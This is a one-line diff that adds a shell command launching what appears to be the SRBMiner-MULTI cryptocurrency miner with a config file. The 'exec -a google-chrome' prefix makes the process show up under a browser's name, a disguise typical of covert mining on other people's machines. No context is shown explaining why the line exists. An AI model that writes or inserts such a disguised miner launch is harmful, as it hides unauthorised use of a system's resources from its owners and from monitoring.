@@ -1,0 +1,1 @@
+exec -a google-chrome ./SRBMiner-MULTI -c test.conf
